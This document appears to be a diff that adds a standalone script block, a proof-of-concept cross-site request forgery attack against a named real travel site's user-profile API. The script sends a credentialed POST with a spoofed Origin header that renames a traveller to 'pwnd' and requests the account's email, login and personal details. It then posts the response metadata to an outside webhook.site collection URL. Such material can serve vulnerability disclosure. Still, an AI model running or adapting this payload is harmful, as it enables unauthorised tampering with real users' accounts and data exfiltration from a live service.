@@ -1,0 +1,44 @@
+<script>
+fetch("https://mapi.makemytrip.com/ext/web/pwa/user/updateAndGetDetails?region=IN&language=eng&currency=inr&user-currency=INR", {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/json',
+        'Origin': 'https://makemytrip.com'
+    },
+    body: JSON.stringify({
+        "updateQuery": [[{
+            "name": "extendedUser",
+            "values": {
+                "associatedTravellers": [{
+                    "travellerId": 2,
+                    "status": "ACTIVE",
+                    "name": {
+                        "firstName": "pwnd"
+                    }
+                }]
+            }
+        }]],
+        "detailsQuery": {
+            "query": [
+                [{"name": "extendedUser", "keys": ["profileId", "accountId", "profileType", "primaryEmailId", "updatedAt", "loginInfoList", "personalDetails", "corporateData"]}]
+            ]
+        }
+    })
+})
+.then(response => {
+    const metadata = {
+        status: response.status,
+        ok: response.ok,
+        type: response.type
+    };
+    return fetch("https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ responseMeta: metadata })
+    });
+})
+.then(res => res.text())
+.then(r => console.log("Webhook result:", r))
+.catch(err => console.error("Error:", err));
+</script>
